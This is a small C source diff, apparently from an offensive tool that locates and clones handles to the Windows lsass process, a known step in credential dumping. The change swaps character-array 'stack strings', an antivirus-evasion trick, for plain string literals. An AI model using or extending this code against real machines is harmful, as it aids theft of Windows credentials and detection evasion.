@@ -47,7 +47,7 @@ HANDLE check_handles(PSYSTEM_HANDLE_INFORMATION handle_info, DWORD in_pid, char*
     char* process_name = NULL;
 
     wchar_t str_process[] = { L'P',L'r',L'o',L'c',L'e',L's',L's', 0x00 };
-    char str_lsass[] = { 'l','s','a','s','s', 0x00 };
+    char str_lsass[] = "lsass";
 
     for (idx_handle = 0; idx_handle < handle_info->HandleCount; idx_handle++) {
 
@@ -92,8 +92,8 @@ HANDLE check_handles(PSYSTEM_HANDLE_INFORMATION handle_info, DWORD in_pid, char*
 
                 process_name = (char*)ptr_functions->_PathFindFileNameA(process_path);
 
-                char msg_found[] = { '[','+',']',' ','F','o','u','n','d',' ','a','n','d',' ','s','u','c','c','e','s','s','f','u','l','l','y',' ','c','l','o','n','e','d',' ','h','a','n','d','l','e',' ','(','%','d',')',' ','t','o',' ','l','s','a','s','s',' ','i','n',':',' ','%','s',' ','(','%','d',')','\n', 0x00 };
-                char msg_handle_rights[] = { '\t','[','+',']',' ','H','a','n','d','l','e',' ','R','i','g','h','t','s',':',' ','%','x','\n', 0x00 };
+                char msg_found[] = "[+] Found and successfully cloned handle (%d) to lsass in: %s (%d)\n";
+                char msg_handle_rights[] = "\t[+] Handle Rights: %x\n";
 
                 char tmp[512] = { 0x00 };
                 char tmp_1[512] = { 0x00 };
